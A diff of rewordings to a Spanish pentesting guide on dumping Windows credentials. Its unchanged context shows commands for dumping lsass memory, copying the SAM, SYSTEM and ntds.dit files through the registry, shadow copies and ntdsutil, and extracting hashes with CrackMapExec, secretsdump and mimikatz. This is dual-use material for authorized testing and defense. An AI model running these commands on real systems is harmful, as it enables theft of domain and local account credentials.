@@ -91,7 +91,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 ### Volcando lsass con procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que es parte de la suite de [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que forma parte de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
@@ -110,7 +110,7 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 ## CrackMapExec
 
-### Volcar hashes SAM
+### Volcar hashes de SAM
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -127,13 +127,13 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### Muestra el atributo pwdLastSet para cada cuenta NTDS.dit
+### Mostrar el atributo pwdLastSet para cada cuenta NTDS.dit
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Robo de SAM y SYSTEM
+## Robando SAM y SYSTEM
 
-Estos archivos deben estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de manera regular** porque están protegidos.
+Estos archivos deben estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de una manera regular** porque están protegidos.
 
 ### Desde el Registro
 
@@ -148,7 +148,7 @@ reg save HKLM\security security
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Copia de Sombra de Volumen
+### Volume Shadow Copy
 
 Puedes realizar copias de archivos protegidos utilizando este servicio. Necesitas ser Administrador.
 
@@ -167,7 +167,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Pero también puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public) pero puedes usar esto para copiar cualquier archivo protegido:
+Pero también puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public), pero puedes usar esto para copiar cualquier archivo protegido:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -178,7 +178,7 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 ### Invoke-NinjaCopy
 
-Finalmente, también podrías usar el [**script de PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
+Finalmente, también podrías usar el [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
@@ -189,7 +189,7 @@ El archivo **NTDS.dit** es conocido como el corazón de **Active Directory**, co
 Dentro de esta base de datos, se mantienen tres tablas principales:
 
 - **Tabla de Datos**: Esta tabla se encarga de almacenar detalles sobre objetos como usuarios y grupos.
-- **Tabla de Enlaces**: Realiza un seguimiento de las relaciones, como las membresías de grupos.
+- **Tabla de Enlaces**: Lleva un registro de las relaciones, como las membresías de grupos.
 - **Tabla SD**: Aquí se mantienen los **descriptores de seguridad** para cada objeto, asegurando la seguridad y el control de acceso para los objetos almacenados.
 
 Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
@@ -204,7 +204,7 @@ El hash está cifrado 3 veces:
 2. Desencriptar el **hash** usando **PEK** y **RC4**.
 3. Desencriptar el **hash** usando **DES**.
 
-**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** usando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por esta razón, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** usando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por esto, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Copiando NTDS.dit usando Ntdsutil
 
@@ -212,9 +212,9 @@ Disponible desde Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-También podrías usar el truco de [**copia de sombra de volumen**](./#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (nuevamente, [**dumps desde el registro o usa el truco de copia de sombra de volumen**](./#stealing-sam-and-system)).
+También podrías usar el [**volumen de copia de sombra**](#stealing-sam-and-system) truco para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (nuevamente, [**sácalo del registro o usa el volumen de copia de sombra**](#stealing-sam-and-system) truco).
 
-### **Extracción de hashes de NTDS.dit**
+### **Extrayendo hashes de NTDS.dit**
 
 Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes usar herramientas como _secretsdump.py_ para **extraer los hashes**:
 ```bash
@@ -228,7 +228,7 @@ Para **grandes archivos NTDS.dit** se recomienda extraerlo usando [gosecretsdump
 
 Finalmente, también puedes usar el **módulo de metasploit**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`
 
-### **Extrayendo objetos de dominio de NTDS.dit a una base de datos SQLite**
+### **Extracción de objetos de dominio de NTDS.dit a una base de datos SQLite**
 
 Los objetos NTDS se pueden extraer a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también todos los objetos y sus atributos para una extracción de información adicional cuando el archivo NTDS.dit en bruto ya ha sido recuperado.
 ```
@@ -246,7 +246,7 @@ lazagne.exe all
 
 ### Windows credentials Editor (WCE)
 
-Esta herramienta se puede utilizar para extraer credenciales de la memoria. Descárgala de: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Esta herramienta se puede usar para extraer credenciales de la memoria. Descárgala de: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
